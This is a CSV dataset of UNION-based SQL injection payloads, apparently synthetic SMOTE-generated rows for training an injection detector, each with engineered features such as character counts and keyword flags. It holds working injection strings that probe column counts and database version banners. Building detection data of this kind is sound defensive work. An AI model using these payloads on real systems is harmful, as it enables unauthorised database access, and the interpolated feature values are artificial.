id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000907,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,0.88077361862322,78.61460059221903,29.57682507402738,4.251658959757598,29.0,24.614600592219038,15.0,10.0,0.3698379338868899,0.31133626103820505,0.19129548304494307,0.12753032202996203,1.8463498519452408,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.1536501480547594,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000908,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.1064831745845231,76.0,33.85093297246222,4.462386075059046,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.149067027537782,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000909,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,0.6709712937957473,45.97987498554785,20.0,3.9320363088319685,14.0,20.78389998843828,4.0,7.19597499710957,0.30814087510116506,0.4478389998843828,0.0880402500289043,0.15597987498554786,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.1959749971095697,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000910,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000077,0.26653995557955357,115.0,26.387873444707658,4.040507295576705,29.77574688941532,51.224253110584684,15.193936722353829,18.80606327764617,0.25891953816882884,0.44542828791812766,0.1321211888900333,0.16353098502301017,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.806063277646171,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.09696836117691487,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0969683611769145
SMOTE_000911,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.07152173591927223,45.41050995350427,18.164203981401705,3.7983372402667688,14.0,20.32840796280341,4.0,7.082101990700853,0.3085568269559735,0.44736362633603033,0.08815909341599241,0.1559204532920038,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.0821019907008527,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000912,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,0.09530444229656285,94.89000798355583,30.65200106447411,4.3451131003014725,37.0,27.912006386844663,17.0,12.978001596711167,0.3919650481067126,0.29150480245615656,0.1800920491301112,0.13643810030701958,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9780015967111657,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000913,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,1.0599085451055967,58.78203160579602,20.630338600966006,3.8553059685134636,14.0,30.521354403864017,4.0,10.260677201932008,0.23876350447655906,0.5188606877049873,0.06821814413615974,0.17415766368229396,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.6303386009660041,0.0,5.630338600966004,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000914,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.01204282822338235,114.90374977965608,27.00641668135626,3.710333380346848,25.0,51.922999823724865,22.0,15.980749955931216,0.21760054395726935,0.451839129668369,0.19148847868239705,0.13907184769196457,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.980749955931216,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000915,attack,union,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",nearest_attack_euclidean,R000073,0.8606730999628053,103.93172583917621,28.0,3.920462869310328,25.0,45.14434157137704,19.85825617853278,13.92912808926639,0.24210233177131912,0.4341304723920837,0.19002054850212408,0.13374664733447308,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.6430426964221299,0.0,0.0,7.286085392844259,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000916,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000034,0.2872830139336183,89.68883645674538,26.18764849519393,3.7915124975949768,46.56294548558179,3.0,29.750593980775722,10.375296990387861,0.5194297944846428,0.033497363007235714,0.33154592467931676,0.11552691782880482,0.0,1.0,2.0,0.0,1.0,1.0,0.0,3.1876484951939306,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000917,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.6513649284080669,116.10672164012074,28.814229552016098,4.179337901490405,37.0,44.885377312096594,17.0,17.22134432802415,0.31993100358658416,0.3849543737255124,0.14699532597221437,0.14811929671568905,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.221344328024148,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000918,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.18109052572414963,89.09027609012715,29.818055218025428,4.312901887797908,36.27222087210171,24.0,16.818055218025428,12.0,0.40668884210478473,0.2696990796995762,0.188762538345851,0.1348495398497881,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.9090276090127141,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.909027609012714
SMOTE_000919,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000043,0.01088557140326169,80.04092468806908,25.983630124772365,4.163383097876491,27.0,32.03273975045527,11.0,10.008184937613818,0.33733750491501985,0.40019258676738395,0.13743379829871177,0.12503611001888448,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,6.008184937613818,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000920,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000120,0.03618810515973314,40.0,19.050189612934915,3.9045828916808496,14.0,16.0,4.0,6.0,0.35,0.4,0.09999999999999999,0.15,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000921,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.6360599240129762,111.91802202073978,29.0,4.049309872673853,35.48583419690166,44.0,16.621458549225416,15.810729274612708,0.3164212471196915,0.3937665671169689,0.14846192303347988,0.14135026272985965,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,3.810729274612708,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8107292746127078,2.0,1.0,1.0,0.8107292746127079,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.810729274612708
SMOTE_000922,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.30907557675982605,54.56239843524065,20.0,3.801683051727946,14.0,26.849918748192522,4.0,9.71247968704813,0.2570470664939184,0.49154352020729797,0.07344201899826239,0.17796739430052128,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,4.7124796870481305,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000923,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,2.7260057187199678,92.83431703552822,26.0,3.7289605920302584,44.06627318578871,3.9668634071056417,32.86745362842258,11.933726814211289,0.4772093525875589,0.04227516566775419,0.35275286703048103,0.12776261471420583,1.450295110658466,0.5165682964471778,2.0,0.0,1.0,1.4834317035528222,0.0,3.4834317035528217,0.0,0.0,1.0,4.483431703552822,0.48343170355282206,0.5165682964471779,1.0,0.516568296447178,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000924,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.25108966514390463,98.17057159705628,29.49765704176623,4.23567105186987,37.0,31.336457277645025,17.0,12.834114319411256,0.37703512259928196,0.3190254652246998,0.1732323536266971,0.13070705854932116,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.8341143194112566,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000925,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000029,0.05523666894257205,83.0,28.0,3.9653062221527096,43.948223369311656,2.025888315344176,25.012944157672088,12.012944157672086,0.5294966671001404,0.024408292955953925,0.3013607729840011,0.14473426695990466,0.038832473016260804,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,0.012944157672086787,0.0,1.0,0.9870558423279131,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000926,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,1.6127051959180245,75.0,32.0,4.392025908269854,44.0,2.4721808266543164,17.0,11.527819173345684,0.5866666666666667,0.03296241102205755,0.22666666666666666,0.1537042556446091,0.0,0.0,2.0,0.0,1.527819173345683,1.0,0.0,-1.1102230246251565e-16,0.47218082665431715,0.0,1.0,6.527819173345683,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000927,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000065,0.16651299349674317,56.22325070975319,19.244650141950636,3.8288596451821135,14.0,28.978600567802555,4.0,9.244650141950638,0.2497551021156518,0.5145655975821122,0.07135860060447195,0.16432069969776403,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.244650141950639,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000928,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000145,0.2861877301424391,93.77043103110013,26.0,3.935992315573135,25.0,36.0,20.946083740942974,11.824347290157162,0.266834835433313,0.38424216302397074,0.22283833405566741,0.1260846674870489,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.8243472901571622,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000929,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.20422554314500427,114.13952706626493,27.172094586747015,3.7513375403405873,25.0,51.31162165301194,22.0,15.827905413252985,0.2190918437425594,0.4494530500119049,0.19280082249345232,0.13865428375208336,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.827905413252985,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000930,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,1.7750753284842191,106.38319041860083,26.314957125580253,4.007674863498944,66.0,4.0,27.506552334880674,8.876638083720168,0.6217357696404364,0.03768095573578406,0.2573942374047101,0.08318903721906953,0.0,0.0,2.0,0.0,1.5616809581399156,2.0,0.0,0.8766380837201683,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4383190418600842,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000931,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,1.4287500087309812,100.83526019214851,26.0,4.078935759893961,64.25289028822276,4.0,23.417630096074255,9.164739807851493,0.637124278109502,0.039672446983471166,0.23221098286156958,0.0909922920454573,1.7471097117772405,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.417630096074253,0.5823699039257468,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000932,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.4602396752299386,115.76178446966965,30.05707068180179,4.138271618387919,37.0,45.40942757573572,17.0,16.35235689393393,0.3197563006503187,0.3920946651163502,0.1469150570555518,0.14123397717777927,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.35235689393393,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000933,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.04566875509871066,85.33701101852621,26.0,4.023540131497978,25.0,28.269608814820966,22.0,10.067402203705242,0.29307426929248853,0.33108116913201835,0.2579053569773899,0.11793920459810321,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.0674022037052415,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000934,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,0.7041529810973242,78.29064186685251,27.0,4.072021399586965,25.0,28.232513493482013,16.0,9.058128373370504,0.3206360708580107,0.3588047664993772,0.20520708534912688,0.11535207729348516,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0581283733705034,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000935,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.12049139689113797,101.1293497283602,26.0,4.032406644003808,62.5173989134408,4.8706502716398,24.8706502716398,8.8706502716398,0.6181554656473683,0.048174036963096356,0.2459427231825485,0.0877277742069868,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.8706502716398,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000936,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,0.19852206432518554,84.25364932567022,24.29854026973191,3.9502701201069126,27.0,35.40291946053618,11.0,10.850729865134046,0.32061051003042706,0.4200171732972716,0.13061909667906288,0.12875321999323844,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,6.850729865134044,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000937,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000029,2.484690084878781,89.23513225930049,27.554633410049966,3.8791369665626125,46.226832949750175,2.4453665899500336,28.562932719600276,12.0,0.519001529675822,0.027138884914576056,0.3185747247850343,0.13528486062456765,0.0,0.44536658995003475,2.0,0.0,1.0,1.0,0.0,2.89073317990007,0.0,0.0,1.0,5.10926682009993,0.0,0.44536658995003486,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.4453665899500349,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.445366589950035
SMOTE_000938,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.5018426434561444,112.88556316199185,27.42288736760163,3.810651722457524,25.0,50.308450529593486,22.0,15.577112632398372,0.22157003327669594,0.44548794675728653,0.19498162928349244,0.13796039068252514,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.577112632398372,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
